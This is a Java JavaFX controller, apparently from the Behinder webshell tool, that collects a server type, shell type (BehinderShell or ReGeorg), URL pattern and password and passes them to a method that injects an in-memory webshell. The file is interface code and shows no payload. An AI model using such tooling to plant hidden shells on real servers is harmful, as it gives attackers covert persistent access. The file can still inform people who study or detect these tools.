package net.rebeyond.behinder.ui.controller;

import javafx.collections.FXCollections;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import net.rebeyond.behinder.core.ShellService;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class MemoryShellViewController {

    private ShellService currentShellService;
    private List<Thread> workList = new ArrayList();
    private Label statusLabel;
    private String[] webEnvList = {"Tomcat", "Weblogic", "Wildfly", "Websphere"};
    private String[] shellList = {"BehinderShell", "ReGeorg"};
    @FXML
    private ComboBox webEnvs;
    @FXML
    private ComboBox shells;
    @FXML
    private Button submit;
    @FXML
    private TextArea textArea;
    @FXML
    private TextField urlPatern;
    @FXML
    private TextField password;


    public void init(ShellService currentShellService, List<Thread> workList, Label statusLabel) {
        this.currentShellService = currentShellService;
        this.workList = workList;
        this.statusLabel = statusLabel;

        this.initMemoryShellView();
    }

    private void initMemoryShellView() {
        this.webEnvs.setItems(FXCollections.observableArrayList(this.webEnvList));
        this.shells.setItems(FXCollections.observableArrayList(this.shellList));

        this.submit.setOnAction(
                (event) -> {
                    try {
                        if (
                                !this.webEnvs.getValue().toString().equals("")
                                && !this.shells.getValue().toString().equals("")
                                && !urlPatern.getText().equals("")
                                && !password.getText().equals("")
                        ) {
                            JSONObject jsonObject = this.currentShellService.injectMemoryShell(
                                    this.webEnvs.getValue().toString(),
                                    this.shells.getValue().toString(),
                                    urlPatern.getText(),
                                    password.getText());
                            this.textArea.appendText((String) jsonObject.get("msg"));
                            this.statusLabel.setText((String) jsonObject.get("status"));
                        } else {
                            this.textArea.appendText("环境、shell类型、路由和密码均不能为空！");
                        }
                    } catch (Exception e) {
                        this.textArea.setText(e.getMessage());
//                        this.statusLabel.setText(e.getMessage());
                    }
                }
        );
    }
}
